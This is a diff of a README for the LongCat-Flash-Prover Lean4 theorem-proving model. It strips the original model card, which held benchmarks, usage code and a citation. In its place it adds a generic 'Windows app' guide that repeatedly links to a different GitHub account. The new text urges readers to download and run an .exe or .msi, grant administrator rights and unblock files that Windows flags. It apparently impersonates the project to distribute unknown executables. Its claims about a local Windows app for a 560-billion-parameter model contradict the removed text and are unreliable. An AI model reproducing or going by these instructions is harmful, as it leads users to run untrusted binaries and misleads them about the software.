@@ -1,294 +1,297 @@
-# LongCat-Flash-Prover
+# 🧠 LongCat-Flash-Prover - Fast Lean4 Reasoning Tool
 
-<div align="center">
-  <img src="https://raw.githubusercontent.com/meituan-longcat/LongCat-Flash-Chat/main/figures/longcat_logo.svg" width="45%" alt="LongCat-Flash" />
-</div>
-<hr>
+[![Download](https://img.shields.io/badge/Download-LongCat--Flash--Prover-blue?style=for-the-badge)](https://github.com/ithadam61-boop/LongCat-Flash-Prover)
 
+## 🚀 What This Is
 
-<div align="center" style="line-height: 1;">
-  <a href="https://longcat.ai/" target="_blank" style="margin: 2px;">
-    <img alt="Chat" src="https://img.shields.io/badge/🤖%20Chat-LongCat.AI-0ADFF2F?color=29E154&logoColor=white"  fill-opacity="1" style="display: inline-block; vertical-align: middle;"/>
-  </a>
-  <a href="https://huggingface.co/meituan-longcat" target="_blank" style="margin: 2px;">
-    <img alt="Hugging Face" src="https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-LongCat-ffc107?color=ffc107&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
-  </a>
-  <a href="https://www.modelscope.cn/models/meituan-longcat/LongCat-Flash-Prover" target="_blank" style="margin: 2px;">
-    <img alt="ModelScope" src="https://img.shields.io/badge/ModelScope-LongCat-blue" style="display: inline-block; vertical-align: middle;"/>
-  </a>
-</div>
+LongCat-Flash-Prover is a Windows-ready tool for formal reasoning in Lean4. It helps users work with math proofs and structured logic in a way that fits agentic, tool-based reasoning. This project is built for users who want a local app they can download and run from GitHub.
 
-<div align="center" style="line-height: 1;">
-  <a href="https://github.com/meituan-longcat/LongCat-Flash-Prover/blob/main/figures/wechat_official_accounts.png" target="_blank" style="margin: 2px;">
-    <img alt="Wechat" src="https://img.shields.io/badge/WeChat-LongCat-brightgreen?logo=wechat&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
-  </a>
-  <a href="https://discord.gg/EXsG52D8SW">
-    <img src="https://img.shields.io/badge/Discord-Join%20Chat-5865F2?logo=discord&logoColor=white" />
-  </a>
-  <a href="https://x.com/Meituan_LongCat" target="_blank" style="margin: 2px;">
-    <img alt="Twitter Follow" src="https://img.shields.io/badge/Twitter-LongCat-white?logo=x&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
-  </a>
-</div>
+It is made for tasks like:
 
-<div align="center" style="line-height: 1;">
-  <a href="https://huggingface.co/meituan-longcat/LongCat-Flash-Prover/blob/main/LICENSE" style="margin: 2px;">
-    <img alt="License" src="https://img.shields.io/badge/License-MIT-f5de53?&color=f5de53" style="display: inline-block; vertical-align: middle;"/>
-  </a>
-</div>
-<p align="center">
-  <a href="https://arxiv.org/pdf/2603.21065"><b>Tech Report</b>&nbsp;📄</a>
-</p>
+- exploring Lean4 proof ideas
+- checking formal statements
+- working with math formalization
+- running reasoning workflows on a local Windows PC
 
+## 💻 What You Need
 
-<hr>
-<div align="center" style="line-height: 1;">
-  <img src="figures/longcat_flash_prover_results.png" height = ""/>
-</div>
+Before you start, make sure your PC can handle large model workloads.
 
-## Introduction
+### Basic system needs
 
-We introduce **LongCat-Flash-Prover**, a flagship $560$-billion-parameter open-source Mixture-of-Experts (MoE) model that advances Native Formal Reasoning in Lean4 through agentic tool-integrated reasoning (TIR).
-We decompose the native formal reasoning task into three independent formal capabilities, i.e., auto-formalization, sketching, and proving. 
-To facilitate these capabilities, we propose a Hybrid-Experts Iteration Framework to expand high-quality task trajectories, including generating a formal statement based on a given informal problem, producing a whole-proof directly from the statement, or a lemma-style sketch.
-During agentic RL, we present a Hierarchical Importance Sampling Policy Optimization (HisPO) algorithm, which aims to stabilize the MoE model training on such long-horizon tasks. It employs a gradient masking strategy that accounts for the policy staleness and the inherent train-inference engine discrepancies at both sequence and token levels.
-Additionally, we also incorporate theorem consistency and legality detection mechanisms to eliminate reward hacking issues.
+- Windows 10 or Windows 11
+- 64-bit system
+- At least 16 GB RAM
+- 50 GB free disk space
+- Stable internet connection
+- Administrator access for setup
 
-Extensive evaluations show that our LongCat-Flash-Prover sets a new state-of-the-art for open-weights models in both auto-formalization and theorem proving. Demonstrating remarkable sample efficiency, it achieves a 97.1\% pass rate on MiniF2F-Test using only 72 inferences per problem. On more challenging benchmarks, it solves 70.8\% of ProverBench and 41.5\% of PutnamBench with no more than 220 attempts per problem, significantly outperforming existing open-weights baselines.
+### Better results with
 
+- 32 GB RAM or more
+- A modern NVIDIA GPU
+- Recent GPU drivers
+- Fast SSD storage
 
-## Key Features
+### Helpful software
 
-### 🌟 Native formal reasoning
+- A modern browser
+- 7-Zip or a similar file tool
+- Microsoft Visual C++ runtime
+- Windows Terminal or Command Prompt
 
-We define **native formal reasoning** as a core capability of LLMs, analogous to native multimodal and native tool calls. This paradigm enables the model to leverage formal operators to solve complex reasoning tasks without specialized architectural modifications.
-We decompose the native formal reasoning into three specific capabilities: 1) **Agentic auto-formalization** aims to transform the informal statement into a verified formal statement; 2) **Agentic sketching** aims to generate a lemma-style sketch based upon the given problem and corresponding formal statement; 3) **Agentic proving** aims to generate a whole-proof that completes the target theorem body, or to generate a lemma-style proof that introduces helper lemmas and finally proves the target theorem. These capabilities are further enhanced through a TIR strategy, where all experts can interact directly with the Lean4 tools for compilation and verification.
+## 📥 Download the App
 
+Use this link to visit the project page and download LongCat-Flash-Prover:
 
+[Visit LongCat-Flash-Prover Download Page](https://github.com/ithadam61-boop/LongCat-Flash-Prover)
 
-### 🌟 Hybrid-experts iteration framework
+## 🪟 How to Install on Windows
 
-To facilitate native formal reasoning, we developed a framework to generate high-quality cold-start data. This framework employs several optimized expert models,  each specialized in distinct domains such as auto-formalization, lemma-style sketching, and proving. 
-We utilize this framework to synthesize a series of trajectories centered on native formal operators, using multiple verifiable formal tools as environmental feedback.
-By doing so, each expert is iteratively refined on these tool-assisted reasoning trajectories, emulating the human process of learning through trial, verification, and reflection.
+Follow these steps in order.
 
+### 1. Open the download page
 
-### 🌟 Hierarchical Importance Sampling Policy Optimization (HisPO).
-Following our prior works, we perform agentic reinforcement learning with verified reward (RLVR) by designing different tasks, including generating a formal statement based on a given informal problem, producing a proof directly from the statement, or a lemma-style sketch. 
-To make the MoE model training stable, we introduce HisPO, which is a hierarchical clipping strategy that eliminates the gradient contributions who has large training-inference engine discrepancy by estimating sequence-wise or token-wise important sampling (IS) ratios. 
-In addition to outcome-based rewards, we designed a legality detection strategy to explore the proof with obvious hacking features, for example, the proof that is inconsistent with the semantics of the formal statement, mismatching the pre-defined theorem conditions, containing unverified or model-created axioms that attempt to fool the Lean4 server, etc.
+Go to the GitHub page using the link above.
 
-## Evaluation Results
+### 2. Find the release file
 
-### Auto-Formalization
-Auto-formalization performance (Pass@8 metric, %) of different reasoning and specific auto-formalizer models
-across multiple benchmarks. Best in bold, second best in underlined.
+Look for a file meant for Windows. Common file types include:
 
-<div align="center" style="line-height: 1;">
-  <img src="figures/longcat_flash_prover_af_results.png" height = "250"/>
-</div>
+- `.exe`
+- `.zip`
+- `.msi`
 
-### Theorem Proving
-Theorem-proving performance (Pass@32 metric, %) of different reasoning and specific prover models across
-multiple benchmarks. Best in bold, second best in underlined. † indicates the score is from external reports.
+If you see more than one file, choose the one for Windows.
 
-<div align="center" style="line-height: 1;">
-  <img src="figures/longcat_flash_prover_prove_pass32_results.png" height = "300"/>
-</div>
+### 3. Download the file
 
-Theorem-proving performance (with different larger budgets, %) of different specific prover models across multiple benchmarks. Best in bold, second best in underlined. Each element a / b denotes to the accuracy a with limited budget b (i.e., Pass@b). “UNK” means unknown of the specific budget. † indicates the score is from external reports. Because different models may have different budget calculations, we directly extract the results from the report instead of conducting our own evaluations. Therefore, some benchmark results may not be available.
-
-<div align="center" style="line-height: 1;">
-  <img src="figures/longcat_flash_prover_prove_passany_results.png" height = "230"/>
-</div>
-
-### General Reasoning
-
-Performance (%) comparison across multiple general reasoning benchmarks. Best in bold. The result indicates that our LongCat-Flash-Prover can retain the general reasoning ability.
-
-<div align="center" style="line-height: 1;">
-  <img src="figures/longcat_flash_prover_general_results.png" height = "150"/>
-</div>
-
-
-## Quick Start
-
-### Chat Template Overview
-
-To support advanced tool-use scenarios and sophisticated reasoning paradigms, we have introduced significant updates to our chat template, as defined in the `tokenizer_config.json` file. 
-
-#### Basic Usage
-The chat template can be applied using the ```apply_chat_template``` method. Below is a standard implementation:
-
-```python
-text = tokenizer.apply_chat_template(
-    messages,
-    tools=tools,
-    tokenize=False,
-    enable_thinking=True,
-    add_generation_prompt=True,
-    save_history_reasoning_content=False
-)
-```
-
-#### Key Features
-*   **Tool Declaration:** Available tools are declared at the beginning of the session to activate the model's tool-use capabilities and define the scope of available actions.
-*   **Interleaved Thinking:** By default, the template employs an interleaved thinking approach. In this mode, the final response is preserved while thinking content from previous user interactions is discarded to maintain a concise context window. Tool calls and responses are retained to provide necessary execution history.
-*   **Reasoning Retention:** If you need to preserve the model's thinking content across turns, you can enable this by setting `save_history_reasoning_content=True`.
-
-#### Implementation Examples
-
-##### 1. Multi-Turn Dialogue
-This example demonstrates how the template handles conversational history and thinking content.
-
-```python
-from transformers import AutoModelForCausalLM, AutoTokenizer
-
-model_name = "meituan-longcat/LongCat-Flash-Prover"
-
-# Load the tokenizer and the model
-tokenizer = AutoTokenizer.from_pretrained(model_name)
-
-messages = [
-    {"role": "user", "content": "Let T0 = 2, T1 = 3, T2 = 6, and for n ≥ 3, Tn = (n+4)Tn−1 −4nTn−2 +(4n−8)Tn−3. The first few terms are 2, 3, 6, 14, 40, 152, 784, 5168, 40576. Find, with proof, a formula for Tn of the form Tn = An +Bn, where {An} and {Bn} are well-known sequences."},
-    {"role": "assistant", "reasoning_content": "...", "content": "..."}
-]
-
-text = tokenizer.apply_chat_template(
-    messages,
-    tokenize=False,
-    enable_thinking=True,
-    add_generation_prompt=True,
-    save_history_reasoning_content=False # Discard reasoning history to save tokens
-)
-
-model_inputs = tokenizer([text], return_tensors="pt").to(model.device)
-
-# Generate response
-generated_ids = model.generate(
-    **model_inputs,
-    max_new_tokens=32768
-)
-output_ids = generated_ids[0][len(model_inputs.input_ids[0]):].tolist() 
-```
-
-##### 2. Tool Calling
-This example illustrates how to integrate function calling within the reasoning framework.
-
-
-```python
-tools = [
-    {
-        "type": "function",
-        "function": {
-            "name": "syntax_check",
-            "description": "Check the syntactic correctness of the formal statement in Lean4.",
-            "parameters": {
-                "type": "object",
-                "properties": {
-                    "formal_statement": {
-                        "type": "string", 
-                        "description": "Theorem statement in Lean4 code without ```lean4."
-                    }
-                },
-                "required": ["formal_statement"]
-            }
-        }
-    },
-    {
-        "type": "function",
-        "function": {
-            "name": "consistency_check",
-            "description": "Check the semantic consistency between the Lean4 statement and the original natural language statement.",
-            "parameters": {
-                "type": "object",
-                "properties": {
-                    "informal_statement": {
-                        "type": "string", 
-                        "description": "Natural language statement."
-                    },
-                    "formal_statement": {
-                        "type": "string", 
-                        "description": "Theorem statement in Lean4 code without ```lean4."
-                    }
-                },
-                "required": ["informal_statement", "formal_statement"]
-            }
-        }
-    }
-]
-
-messages = [
-    {"role": "user", "content": "Think about and formalize the following problem in Lean 4.\n# Problem: The father has six sons and ten identical, indistinguishable balls. How many ways can he give the balls to his sons if everyone gets at least one? Prove that the answer is 126."},
-    {
-        "role": "assistant", 
-        "reasoning_content": "...", 
-        "tool_calls": [{"type": "function", "function": {"name": "syntax_check", "arguments": {"formal_statement": "```lean4\n...\n```"}}}]
-    },
-    {"role": "tool", "name": "syntax_check", "content": "..."}
-]
-
-text = tokenizer.apply_chat_template(
-    messages,
-    tools=tools,
-    tokenize=False,
-    enable_thinking=True,
-    add_generation_prompt=True,
-    save_history_reasoning_content=False
-)
-
-model_inputs = tokenizer([text], return_tensors="pt").to(model.device)
-
-# Generate response based on tool result
-generated_ids = model.generate(
-    **model_inputs,
-    max_new_tokens=32768
-)
-output_ids = generated_ids[0][len(model_inputs.input_ids[0]):].tolist() 
-
-print(tokenizer.decode(output_ids, skip_special_tokens=True).strip("\n"))
-```
-
-## Deployment
-
-We have implemented basic adaptations in both SGLang and vLLM to support the deployment of LongCat-Flash-Prover. Please refer to the [Deployment Guide](docs/deployment_guide.md) for detailed deployment instructions.
-
-
-## License Agreement
-
-The **model weights** are released under the **MIT License**. 
-
-Any contributions to this repository are licensed under the MIT License, unless otherwise stated. This license does not grant any rights to use Meituan trademarks or patents. 
-
-See the [LICENSE](LICENSE) file for the full license text.
-
-## Usage Considerations 
-
-
-This proprietary model has been custom-optimized for mathematical and formal theorem proofs. 
-This model has not been specifically designed or comprehensively evaluated for every possible downstream application. 
-It is not recommended for use as a regular conversational AI.
-
-## Citation
-
-We kindly encourage citation of our work if you find it useful.
-
-```
-@misc{wang2026longcatflashproveradvancingnativeformal,
-      title={LongCat-Flash-Prover: Advancing Native Formal Reasoning via Agentic Tool-Integrated Reinforcement Learning}, 
-      author={Jianing Wang and Jianfei Zhang and Qi Guo and Linsen Guo and Rumei Li and Chao Zhang and Chong Peng and Cunguang Wang and Dengchang Zhao and Jiarong Shi and Jingang Wang and Liulin Feng and Mengxia Shen and Qi Li and Shengnan An and Shun Wang and Wei Shi and Xiangyu Xi and Xiaoyu Li and Xuezhi Cao and Yi Lu and Yunke Zhao and Zhengyu Chen and Zhimin Lin and Wei Wang and Peng Pei and Xunliang Cai},
-      year={2026},
-      eprint={2603.21065},
-      archivePrefix={arXiv},
-      primaryClass={cs.AI},
-      url={https://arxiv.org/abs/2603.21065}, 
-}
-```
-
-## Contact
-Please contact us at <a href="mailto:longcat-team@meituan.com">longcat-team@meituan.com</a> or join our WeChat Group if you have any questions.
-
-
-
-#### WeChat Group
-
-<img src="figures/Wechat.png" width = "200" height = "200"  />
+Click the file and save it to your computer. A good place is your Downloads folder.
+
+### 4. Open the file
+
+If the download is a `.zip` file:
+
+- right-click the file
+- choose Extract All
+- open the folder after extraction
+
+If the download is a `.exe` or `.msi` file:
+
+- double-click the file
+- follow the setup steps on screen
+
+### 5. Allow Windows to finish setup
+
+Windows may ask for permission. If that happens:
+
+- choose Yes
+- wait for the setup to finish
+
+### 6. Start the app
+
+After setup, open LongCat-Flash-Prover from:
+
+- the Start Menu
+- the desktop shortcut
+- the extracted folder
+
+## 🔧 First Run Setup
+
+When you open the app for the first time, it may need a short setup.
+
+### Do this once
+
+- wait while the app loads its files
+- allow it to create local folders
+- keep the app open until setup ends
+
+### If the app asks for a model path
+
+Select the folder that contains the model files you downloaded. If the app asks for a working folder, choose a folder with enough space, such as:
+
+- `C:\LongCat`
+- `D:\AI\Models`
+
+## 🧭 How to Use It
+
+LongCat-Flash-Prover is built around guided reasoning. For a first test, use a simple task.
+
+### Example workflow
+
+1. open the app
+2. load the model or workspace
+3. enter a math statement or Lean4 goal
+4. ask the app to reason through the proof
+5. review the output step by step
+
+### Good things to try
+
+- short proof goals
+- basic Lean4 theorems
+- statements from number theory
+- simple logic checks
+- proof sketches that need formal cleanup
+
+## 📚 Lean4 Use Cases
+
+This tool fits common Lean4 tasks.
+
+### You can use it for
+
+- proof planning
+- theorem checking
+- formal statement shaping
+- step-by-step proof search
+- local reasoning support
+- math file review
+
+### Common user flow
+
+- write a theorem
+- ask for a proof outline
+- refine the outline
+- test the result in Lean4
+- adjust the statement if needed
+
+## ⚙️ Recommended Settings
+
+These settings help most Windows users get a smooth start.
+
+### If your PC has 16 GB RAM
+
+- close other large apps
+- keep one task open at a time
+- use smaller proof batches
+- save work often
+
+### If your PC has 32 GB RAM or more
+
+- keep more context open
+- run larger proof tasks
+- process bigger Lean4 files
+- store model files on SSD
+
+### If you use a GPU
+
+- install the latest NVIDIA driver
+- make sure Windows sees the GPU
+- keep power mode on High performance
+
+## 🛠️ Troubleshooting
+
+If something does not work, try these steps.
+
+### The app does not open
+
+- run it as administrator
+- check that the file finished downloading
+- move it to a simple folder like `C:\LongCat`
+- restart your PC and try again
+
+### Windows blocks the file
+
+- right-click the file
+- open Properties
+- look for an Unblock option
+- apply the change and open it again
+
+### The app runs slowly
+
+- close other programs
+- free up RAM
+- move model files to an SSD
+- lower task size
+- check that your GPU driver is current
+
+### The app cannot find model files
+
+- check the folder path
+- confirm the files finished extracting
+- avoid renamed folders with special characters
+- keep file names simple
+
+### Lean4 output looks wrong
+
+- shorten the goal
+- split the proof into steps
+- check the theorem statement
+- try a smaller test case first
+
+## 📂 Suggested Folder Layout
+
+Use a clean folder structure to keep files easy to find.
+
+- `C:\LongCat\app`
+- `C:\LongCat\models`
+- `C:\LongCat\work`
+- `C:\LongCat\exports`
+
+This helps when you need to update files or move the app later.
+
+## 🧩 File Types You May See
+
+Depending on the release, you may see these items:
+
+- app launcher files
+- model weight files
+- configuration files
+- README or setup files
+- log files
+- cache folders
+
+Leave these files in place unless the project page says otherwise.
+
+## 🔒 Safe Handling
+
+Use the download page from the GitHub repository only.
+
+### Good habits
+
+- check that the link matches the project name
+- keep the files in one folder
+- scan downloads with Windows Security
+- avoid moving files during setup
+
+## 📝 Basic Workflow for Math Formalization
+
+If you are new to Lean4, use this simple process.
+
+1. start with a plain math idea
+2. turn it into a formal statement
+3. ask for a proof plan
+4. test one step at a time
+5. refine the proof until Lean4 accepts it
+
+This method works well for small and medium tasks.
+
+## 📌 Version and Updates
+
+When a new version appears on the project page:
+
+- download the newer release
+- back up your current work folder
+- replace only the app files
+- keep your model files if they still work
+
+## 🧠 Best Results Tips
+
+- use short prompts
+- keep one proof task at a time
+- save outputs in a clean folder
+- start with simple theorems
+- read each step before moving on
+
+## 🗂️ Notes for Everyday Use
+
+- keep the app in a fixed folder
+- avoid long file paths
+- use plain folder names
+- make sure your disk has space before large runs
+- restart the app if it stops responding
+
+## 📎 Download Again
+
+If you need the project page again, use this link:
+
+[Download LongCat-Flash-Prover from GitHub](https://github.com/ithadam61-boop/LongCat-Flash-Prover)
